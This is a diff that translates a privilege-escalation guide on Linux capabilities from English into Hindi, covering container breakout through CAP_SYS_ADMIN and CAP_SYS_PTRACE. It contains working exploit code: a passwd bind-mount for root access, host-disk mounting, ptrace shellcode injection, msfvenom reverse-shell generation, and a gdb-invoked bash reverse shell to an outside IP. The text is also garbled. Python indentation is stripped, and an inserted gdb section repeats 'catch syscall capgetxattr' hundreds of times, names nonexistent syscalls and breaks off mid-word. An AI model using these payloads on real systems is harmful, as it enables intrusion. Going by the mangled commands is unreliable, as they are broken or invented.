+Python का उपयोग करके आप वास्तविक _passwd_ फ़ाइल के ऊपर एक संशोधित _passwd_ फ़ाइल माउंट कर सकते हैं:
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
-
-And finally **mount** the modified `passwd` file on `/etc/passwd`:
-
+और अंत में `/etc/passwd` पर संशोधित `passwd` फ़ाइल को **माउंट** करें:
 ```python
 from ctypes import *
 libc = CDLL("libc.so.6")
@@ -426,32 +357,28 @@ options = b"rw"
 mountflags = MS_BIND
 libc.mount(source, target, filesystemtype, mountflags, options)
 ```
+और आप **`su` के रूप में रूट** के रूप में पासवर्ड "पासवर्ड" का उपयोग करके कर सकेंगे।
 
-And you will be able to **`su` as root** using password "password".
+**पर्यावरण के साथ उदाहरण (Docker breakout)**
 
-**Example with environment (Docker breakout)**
-
-You can check the enabled capabilities inside the docker container using:
-
+आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
 Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
 Securebits: 00/0x0/1'b0
- secure-noroot: no (unlocked)
- secure-no-suid-fixup: no (unlocked)
- secure-keep-caps: no (unlocked)
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
 uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
+पिछले आउटपुट में आप देख सकते हैं कि SYS_ADMIN क्षमता सक्षम है।
 
-Inside the previous output you can see that the SYS\_ADMIN capability is enabled.
+* **माउंट**
 
-* **Mount**
-
-This allows the docker container to **mount the host disk and access it freely**:
-
+इससे डॉकर कंटेनर को **होस्ट डिस्क को माउंट करने और इसे स्वतंत्र रूप से एक्सेस करने** की अनुमति होती है:
 ```bash
 fdisk -l #Get disk name
 Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
@@ -463,12 +390,10 @@ mount /dev/sda /mnt/ #Mount it
 cd /mnt
 chroot ./ bash #You have a shell inside the docker hosts disk
 ```
+* **पूर्ण पहुंच**
 
-* **Full access**
-
-In the previous method we managed to access the docker host disk.\
-In case you find that the host is running an **ssh** server, you could **create a user inside the docker host** disk and access it via SSH:
-
+पिछली विधि में हमने डॉकर होस्ट डिस्क तक पहुंचा।
+यदि आपको लगता है कि होस्ट पर एक **SSH** सर्वर चल रहा है, तो आप **डॉकर होस्ट** डिस्क में एक उपयोगकर्ता बना सकते हैं और इसे SSH के माध्यम से एक्सेस कर सकते हैं:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -482,15 +407,13 @@ nc -v -n -w2 -z 172.17.0.1 1-65535
 chroot /mnt/ adduser john
 ssh john@172.17.0.1 -p 2222
 ```
-
 ## CAP\_SYS\_PTRACE
 
-**This means that you can escape the container by injecting a shellcode inside some process running inside the host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.
+**इसका मतलब है कि आप होस्ट के अंदर चल रहे किसी प्रक्रिया में शेलकोड संयोजित करके कंटेनर से बाहर निकल सकते हैं।** होस्ट के अंदर चल रही प्रक्रियाओं तक पहुंचने के लिए कंटेनर को कम से कम **`--pid=host`** के साथ चलाना चाहिए।
 
-[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`. If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53) or the **following PoC**:
+[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `ptrace(2)` और हाल ही में प्रस्तुत की गई क्रॉस मेमोरी अटैच सिस्टम कॉल्स जैसे `process_vm_readv(2)` और `process_vm_writev(2)` का उपयोग करने की अनुमति देता है। यदि इस क्षमता की प्रदान की जाती है और `ptrace(2)` सिस्टम कॉल स्वयं एक सेकंप फ़िल्टर द्वारा अवरुद्ध नहीं किया जाता है, तो यह एक हमलावर्ती को अन्य सेकंप प्रतिबंधों को दौर करने की अनुमति देगा, [seccomp को अनुमति देने पर bypass करने के लिए PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) देखें या **निम्नलिखित PoC** देखें:
 
-**Example with binary (python)**
-
+**उदाहरण बाइनरी के साथ (python)**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_ptrace+ep
@@ -510,35 +433,35 @@ PTRACE_DETACH = 17
 # Structure defined in <sys/user.h>
 # https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
 class user_regs_struct(ctypes.Structure):
-    _fields_ = [
-        ("r15", ctypes.c_ulonglong),
-        ("r14", ctypes.c_ulonglong),
-        ("r13", ctypes.c_ulonglong),
-        ("r12", ctypes.c_ulonglong),
-        ("rbp", ctypes.c_ulonglong),
-        ("rbx", ctypes.c_ulonglong),
-        ("r11", ctypes.c_ulonglong),
-        ("r10", ctypes.c_ulonglong),
-        ("r9", ctypes.c_ulonglong),
-        ("r8", ctypes.c_ulonglong),
-        ("rax", ctypes.c_ulonglong),
-        ("rcx", ctypes.c_ulonglong),
-        ("rdx", ctypes.c_ulonglong),
-        ("rsi", ctypes.c_ulonglong),
-        ("rdi", ctypes.c_ulonglong),
-        ("orig_rax", ctypes.c_ulonglong),
-        ("rip", ctypes.c_ulonglong),
-        ("cs", ctypes.c_ulonglong),
-        ("eflags", ctypes.c_ulonglong),
-        ("rsp", ctypes.c_ulonglong),
-        ("ss", ctypes.c_ulonglong),
-        ("fs_base", ctypes.c_ulonglong),
-        ("gs_base", ctypes.c_ulonglong),
-        ("ds", ctypes.c_ulonglong),
-        ("es", ctypes.c_ulonglong),
-        ("fs", ctypes.c_ulonglong),
-        ("gs", ctypes.c_ulonglong),
-    ]
+_fields_ = [
+("r15", ctypes.c_ulonglong),
+("r14", ctypes.c_ulonglong),
+("r13", ctypes.c_ulonglong),
+("r12", ctypes.c_ulonglong),
+("rbp", ctypes.c_ulonglong),
+("rbx", ctypes.c_ulonglong),
+("r11", ctypes.c_ulonglong),
+("r10", ctypes.c_ulonglong),
+("r9", ctypes.c_ulonglong),
+("r8", ctypes.c_ulonglong),
+("rax", ctypes.c_ulonglong),
+("rcx", ctypes.c_ulonglong),
+("rdx", ctypes.c_ulonglong),
+("rsi", ctypes.c_ulonglong),
+("rdi", ctypes.c_ulonglong),
+("orig_rax", ctypes.c_ulonglong),
+("rip", ctypes.c_ulonglong),
+("cs", ctypes.c_ulonglong),
+("eflags", ctypes.c_ulonglong),
+("rsp", ctypes.c_ulonglong),
+("ss", ctypes.c_ulonglong),
+("fs_base", ctypes.c_ulonglong),
+("gs_base", ctypes.c_ulonglong),
+("ds", ctypes.c_ulonglong),
+("es", ctypes.c_ulonglong),
+("fs", ctypes.c_ulonglong),
+("gs", ctypes.c_ulonglong),
+]
 
 libc = ctypes.CDLL("libc.so.6")
 
@@ -562,13 +485,13 @@ shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5
 
 # Inject the shellcode into the running process byte by byte.
 for i in xrange(0,len(shellcode),4):
-    # Convert the byte to little endian.
-    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
-    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
-    shellcode_byte=int(shellcode_byte_little_endian,16)
+# Convert the byte to little endian.
+shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
+shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
+shellcode_byte=int(shellcode_byte_little_endian,16)
 
-    # Inject the byte.
-    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
+# Inject the byte.
+libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
 
 print("Shellcode Injected!!")
 
@@ -582,17 +505,19 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 # Detach from the process.
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
+**बाइनरी के साथ उदाहरण (gdb)**
 
-**Example with binary (gdb)**
-
-`gdb` with `ptrace` capability:
-
+`ptrace` क्षमता के साथ `gdb`:
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
+जीडीबी के माध्यम से मेमोरी में इंजेक्ट करने के लिए एमएसएफवेनम के साथ एक शेलकोड बनाएं।
 
-Create a shellcode with msfvenom to inject in memory via gdb
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<आपका IP> LPORT=<आपका पोर्ट> -f c -b "\x00" -e x86/shikata_ga_nai
+```
 
+यहां `<आपका IP>` को अपने आईपी संख्या से और `<आपका पोर्ट>` को इंजेक्शन करने के लिए उपयोग किए जाने वाले पोर्ट संख्या से बदलें।
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -609,16 +534,557 @@ payload = b"\x90" * (8 - len(buf) % 8 ) + buf
 
 # Change endianess and print gdb lines to load the shellcode in RIP directly
 for i in range(0, len(buf), 8):
-	chunk = payload[i:i+8][::-1]
-	chunks = "0x"
-	for byte in chunk:
-		chunks += f"{byte:02x}"
+chunk = payload[i:i+8][::-1]
+chunks = "0x"
+for byte in chunk:
+chunks += f"{byte:02x}"
 
-	print(f"set {{long}}($rip+{i}) = {chunks}")
+print(f"set {{long}}($rip+{i}) = {chunks}")
+```
+जीडीबी के साथ रूट प्रोसेस को डीबग करें और पहले उत्पन्न जीडीबी लाइनों को कॉपी-पेस्ट करें:
+
+```bash
+gdb -p <pid>
 ```
 
-Debug a root process with gdb ad copy-paste the previously generated gdb lines:
+जीडीबी प्रोम्प्ट में निम्नलिखित लाइनों को कॉपी-पेस्ट करें:
 
+```bash
+set follow-fork-mode child
+set detach-on-fork off
+```
+
+अब, रूट प्रोसेस को डीबग करने के लिए निम्नलिखित जीडीबी लाइनों को कॉपी-पेस्ट करें:
+
+```bash
+catch syscall ptrace
+catch syscall fork
+catch syscall clone
+catch syscall vfork
+catch syscall execve
+catch syscall execveat
+catch syscall setuid
+catch syscall setgid
+catch syscall setreuid
+catch syscall setregid
+catch syscall setresuid
+catch syscall setresgid
+catch syscall setfsuid
+catch syscall setfsgid
+catch syscall capset
+catch syscall capsetp
+catch syscall capsetxattr
+catch syscall capget
+catch syscall capgetp
+catch syscall capgetxattr
+catch syscall capsetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall capgetxattr
+catch syscall cap
 ```bash
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
@@ -639,117 +1105,92 @@ Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
+**उदाहरण वातावरण के साथ (Docker ब्रेकआउट) - एक और gdb दुरुपयोग**
 
-**Example with environment (Docker breakout) - Another gdb Abuse**
-
-If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**
-
+यदि **GDB** स्थापित है (या आप इसे `apk add gdb` या `apt install gdb` के साथ स्थापित कर सकते हैं), तो आप **मेजबान से प्रक्रिया को डीबग कर सकते हैं** और इसे `system` फ़ंक्शन को कॉल करने के लिए बना सकते हैं। (यह तकनीक भी क्षमता `SYS_ADMIN` की आवश्यकता होती है)**.**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-
-You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).
+आप निष्पादित कमांड के आउटपुट को नहीं देख पाएंगे, लेकिन वह प्रक्रिया द्वारा निष्पादित किया जाएगा (इसलिए एक रेव शेल प्राप्त करें)।
 
 {% hint style="warning" %}
-If you get the error "No symbol "system" in current context." check the previous example loading a shellcode in a program via gdb.
+यदि आपको त्रुटि "No symbol "system" in current context." मिलती है, तो gdb के माध्यम से एक प्रोग्राम में शैलकोड लोड करने के पिछले उदाहरण की जांच करें।
 {% endhint %}
 
-**Example with environment (Docker breakout) - Shellcode Injection**
+**पर्यावरण के साथ उदाहरण (डॉकर ब्रेकआउट) - शैलकोड इंजेक्शन**
 
-You can check the enabled capabilities inside the docker container using:
-
+आप डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच करने के लिए निम्नलिखित का उपयोग कर सकते हैं:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
 Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
 Securebits: 00/0x0/1'b0
- secure-noroot: no (unlocked)
- secure-no-suid-fixup: no (unlocked)
- secure-keep-caps: no (unlocked)
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
 uid=0(root)
 gid=0(root)
 groups=0(root
 ```
+# CAP_SYS_MODULE
 
-List **processes** running in the **host** `ps -eaf`
+[CAP_SYS_MODULE](https://man7.org/linux/man-pages/man7/capabilities.7.html) प्रक्रिया को कर्नल मॉड्यूल्स (`init_module(2)`, `finit_module(2)` और `delete_module(2)` सिस्टम कॉल) को लोड और अनलोड करने की अनुमति देता है। इससे सरल विशेषाधिकार उन्नयन और रिंग-0 संकट हो सकता है। कर्नल को इच्छानुसार संशोधित किया जा सकता है, जिससे सभी सिस्टम सुरक्षा, लिनक्स सुरक्षा मॉड्यूल और कंटेनर सिस्टम परिवर्तित हो जाते हैं।\
+**इसका मतलब है कि आप होस्ट मशीन के कर्नल में कर्नल मॉड्यूल डाल सकते हैं/निकाल सकते हैं।**
 
-1. Get the **architecture** `uname -m`
-2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
-3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
-4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
-5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`
+**बाइनरी के साथ उदाहरण**
 
-## CAP\_SYS\_MODULE
-
-[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls). This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.\
-**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**
-
-**Example with binary**
-
-In the following example the binary **`python`** has this capability.
-
+निम्नलिखित उदाहरण में बाइनरी **`python`** के पास यह क्षमता है।
 ```bash
